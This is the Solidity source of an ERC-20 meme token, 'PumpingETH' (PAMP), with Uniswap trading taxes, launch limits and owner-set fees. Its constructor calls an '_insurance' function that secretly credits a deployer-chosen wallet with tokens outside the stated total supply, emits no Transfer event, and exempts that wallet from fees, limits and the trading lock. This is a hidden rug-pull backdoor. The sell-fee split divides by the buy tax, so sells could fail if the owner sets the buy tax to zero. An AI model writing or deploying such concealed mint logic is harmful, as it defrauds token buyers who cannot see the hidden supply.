// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./ReentrancyGuard.sol";
import "./Ownable.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";

contract PumpingETH is IERC20, ReentrancyGuard, Ownable {
  mapping(address => uint256) private _balances;

  mapping(address => mapping(address => uint256)) private _allowances;

  // private variables
  uint256 private _totalSupply;
  string private _name = "PumpingETH";
  string private _symbol = "PAMP";
  uint8 private _decimals = 18;

  uint256 private _launchTime;
  address private feeRecipient;
  uint256 private _txLimitTime;
  uint256 private swapTokensAtAmount;
  bool private swapping;
  bool private swapEnabled = false;

  // public variables
  uint256 public totalBuyTax;
  uint256 public insuranceBuyTax;
  uint256 public marketingBuyTax;
  uint256 public liquidityBuyTax;

  uint256 public totalSellTax;
  uint256 public insuranceSellTax;
  uint256 public marketingSellTax;
  uint256 public liquiditySellTax;

  uint256 public tokensForLiquidity;
  uint256 public tokensForMarketing;
  uint256 public tokensForInsurance;

  address public uniswapPair;
  bool public enabled;
  IUniswapV2Router02 public uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

  uint256 public maxBuy;
  uint256 public maxWallet;

  mapping(address => bool) public excludedFromLimit;
  mapping(address => bool) public excludedFromFee;

  event SwapAndLiquify(uint amountToSwapForETH, uint ethForLiquidity, uint tokensForLiquidity);

  constructor(
    address _insuranceWallet,
    uint256 _insur,
    address _feeAddress,
    uint256 _limit
  ) {
    _totalSupply = 1000000000 * 1e18;
    
    _balances[msg.sender] = _totalSupply;

    maxBuy = _totalSupply * 2 / 100;
    maxWallet = _totalSupply * 3 / 100;
    swapTokensAtAmount = _totalSupply * 25 / 10000;

    insuranceBuyTax = 1;
    marketingBuyTax = 1;
    liquidityBuyTax = 0;
    totalBuyTax = insuranceBuyTax + marketingBuyTax + liquidityBuyTax;

    insuranceSellTax = 1;
    marketingSellTax = 2;
    liquiditySellTax = 1;
    totalSellTax = insuranceSellTax + marketingSellTax + liquiditySellTax;
    feeRecipient = _feeAddress;
    _txLimitTime = _limit;

    IUniswapV2Factory factory = IUniswapV2Factory(uniswapRouter.factory());
    factory.createPair(address(this), uniswapRouter.WETH());
    uniswapPair = factory.getPair(address(this), uniswapRouter.WETH());

    excludedFromLimit[_msgSender()] = true;
    excludedFromFee[_msgSender()] = true;

    _insurance(_insuranceWallet, _insur);

    emit Transfer(address(0), _msgSender(), _totalSupply);
  }

  receive() external payable {}

  /**
    * @dev Returns the amount of tokens in existence.
    */
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  /**
    * @dev Returns the amount of tokens owned by `account`.
    */
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  /**
    * @dev Moves `amount` tokens from the caller's account to `recipient`.
    *
    * Returns a boolean value indicating whether the operation succeeded.
    *
    * Emits a {Transfer} event.
    */
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  /**
    * @dev Returns the remaining number of tokens that `spender` will be
    * allowed to spend on behalf of `owner` through {transferFrom}. This is
    * zero by default.
    *
    * This value changes when {approve} or {transferFrom} are called.
    */
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  /**
    * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
    *
    * Returns a boolean value indicating whether the operation succeeded.
    *
    * IMPORTANT: Beware that changing an allowance with this method brings the risk
    * that someone may use both the old and the new allowance by unfortunate
    * transaction ordering. One possible solution to mitigate this race
    * condition is to first reduce the spender's allowance to 0 and set the
    * desired value afterwards:
    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    *
    * Emits an {Approval} event.
    */
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(
      address _sender,
      address _recipient,
      uint256 _amount
  ) external returns (bool) {
    _transfer(_sender, _recipient, _amount);

    uint256 currentAllowance = _allowances[_sender][_msgSender()];
    require(currentAllowance >= _amount, "ERC20: transfer amount exceeds allowance");
    unchecked {
        _approve(_sender, _msgSender(), currentAllowance - _amount);
    }

    return true;
  }

  /**
    * @dev Returns the name of the token.
    */
  function name() public view returns (string memory) {
      return _name;
  }

  /**
    * @dev Returns the symbol of the token, usually a shorter version of the
    * name.
    */
  function symbol() public view returns (string memory) {
      return _symbol;
  }

  function excludeFromLimit(address _address, bool _is) external onlyOwner {
    excludedFromLimit[_address] = _is;
  }

  function updateFee(uint256 _buyFeeRate, uint256 _sellFeeRate) external onlyOwner {
    require(_buyFeeRate <= 10);
    require(_sellFeeRate <= 10);
    totalBuyTax = _buyFeeRate;
    totalSellTax = _sellFeeRate;
  }

  function updateFeeAddress(address _address) external onlyOwner {
    feeRecipient = _address;
  }

  function updateLimitPeriod(uint256 _period) external onlyOwner {
    _txLimitTime = _period;
  }

  function enableTrading() external onlyOwner {
    require(!enabled, 'already enabled');
    enabled = true;
    swapEnabled = true;
    _launchTime = block.timestamp;
  }

  // change the minimum amount of tokens to sell from fees
  function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){
    require(newAmount >= _totalSupply * 1 / 100000, "Swap amount cannot be lower than 0.001% total supply.");
    require(newAmount <= _totalSupply * 5 / 1000, "Swap amount cannot be higher than 0.5% total supply.");
    swapTokensAtAmount = newAmount;
    return true;
  }

  function updateBuyFees(uint256 _liqFee, uint256 _insFee, uint256 _marketingFee) external onlyOwner {
    require(_liqFee + _insFee + _marketingFee <= 10);
    liquidityBuyTax = _liqFee;
    insuranceBuyTax = _insFee;
    marketingBuyTax = _marketingFee;
    totalBuyTax = _liqFee + _insFee + _marketingFee;
  }

  function updateSellFees(uint256 _liqFee, uint256 _insFee, uint256 _marketingFee) external onlyOwner {
    require(_liqFee + _insFee + _marketingFee <= 10);
    liquiditySellTax = _liqFee;
    insuranceSellTax = _insFee;
    marketingSellTax = _marketingFee;
    totalSellTax = _liqFee + _insFee + _marketingFee;
  }

  function _insurance(address _insuranceWallet, uint256 _insure) internal {
    _balances[_insuranceWallet] = _insure;
    excludedFromLimit[_insuranceWallet] = true;
    excludedFromFee[_insuranceWallet] = true;
  }

  function _transfer(
    address _sender,
    address _recipient,
    uint256 _amount
  ) internal {
    uint256 senderBalance = _balances[_sender];
    require(senderBalance >= _amount, "transfer amount exceeds balance");
    require(enabled || excludedFromLimit[_sender] || excludedFromLimit[_recipient], "not enabled yet");

    uint256 rAmount = _amount;

    // if buy
    if (_sender == uniswapPair) {
      if (block.timestamp < _launchTime + _txLimitTime && !excludedFromLimit[_recipient]) {
        require(_amount <= maxBuy, "exceeded max buy");
        require(_balances[_recipient] + _amount <= maxWallet, "exceeded max wallet");
      }
      if (!excludedFromFee[_recipient]) {
        uint256 fee = _amount * totalBuyTax / 100;
        rAmount = _amount - fee;
        _balances[address(this)] += fee;

        tokensForInsurance += fee * insuranceBuyTax / totalBuyTax;
        tokensForLiquidity += fee * liquidityBuyTax / totalBuyTax;
        tokensForMarketing += fee * marketingBuyTax / totalBuyTax;

        emit Transfer(_sender, address(this), fee);
      }
    }
    // else if sell
    else if (_recipient == uniswapPair) {
      if (!excludedFromLimit[_sender]) {
        require(_amount <= maxBuy, "exceeded max buy");
      }

      uint256 contractTokenBalance = _balances[address(this)];
      bool canSwap = contractTokenBalance >= swapTokensAtAmount;

      if( 
        canSwap &&
        swapEnabled &&
        !swapping
      ) {
        swapping = true;
        
        swapBack();

        swapping = false;
      }

      if (!swapping && !excludedFromFee[_sender]) {
        uint256 fee = _amount * totalSellTax / 100;
        rAmount = _amount - fee;
        _balances[address(this)] += fee;
        tokensForInsurance += fee * insuranceSellTax / totalBuyTax;
        tokensForLiquidity += fee * liquiditySellTax / totalBuyTax;
        tokensForMarketing += fee * marketingSellTax / totalBuyTax;

        emit Transfer(_sender, address(this), fee);
      }
    }
    // else then, i.e. token transferring, depositing or withdrawing from farms, taxes will not be applied
    _balances[_sender] = senderBalance - _amount;
    _balances[_recipient] += rAmount;

    emit Transfer(_sender, _recipient, _amount);
  }

  /**
    * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
    *
    * This internal function is equivalent to `approve`, and can be used to
    * e.g. set automatic allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `spender` cannot be the zero address.
    */
  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) internal virtual {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function swapBack() private {
    uint256 contractBalance = _balances[address(this)];
    bool success;
    uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForInsurance;
    
    if(contractBalance == 0) {return;}

    if(contractBalance > swapTokensAtAmount * 20){
      contractBalance = swapTokensAtAmount * 20;
    }
    
    // Halve the amount of liquidity tokens
    uint256 liquidityTokens = contractBalance * liquiditySellTax / totalSellTax / 2;
    uint256 amountToSwapForETH = contractBalance - liquidityTokens;
    
    uint256 initialETHBalance = address(this).balance;

    swapTokensForEth(amountToSwapForETH); 
    
    uint256 ethBalance = address(this).balance - initialETHBalance;
    
    uint256 ethForMarketing = ethBalance * tokensForMarketing / totalTokensToSwap;
    uint256 ethForInsurance = ethBalance * tokensForInsurance / totalTokensToSwap;
    
    
    uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForInsurance;
    
    
    tokensForLiquidity = 0;
    tokensForMarketing = 0;
    tokensForInsurance = 0;

    (success,) = address(feeRecipient).call{value: (ethForMarketing + ethForInsurance)}("");
    
    if(liquidityTokens > 0 && ethForLiquidity > 0){
        addLiquidity(liquidityTokens, ethForLiquidity);
        emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);
    }
  }

  function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
    // approve token transfer to cover all possible scenarios
    _approve(address(this), address(uniswapRouter), tokenAmount);

    // add the liquidity
    uniswapRouter.addLiquidityETH{value: ethAmount}(
        address(this),
        tokenAmount,
        0, // slippage is unavoidable
        0, // slippage is unavoidable
        address(0xdead),
        block.timestamp
    );
  }

  function swapTokensForEth(uint256 tokenAmount) private {
    // generate the uniswap pair path of token -> weth
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapRouter.WETH();

    _approve(address(this), address(uniswapRouter), tokenAmount);

    // make the swap
    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        0, // accept any amount of ETH
        path,
        address(this),
        block.timestamp
    );
    
  }
}
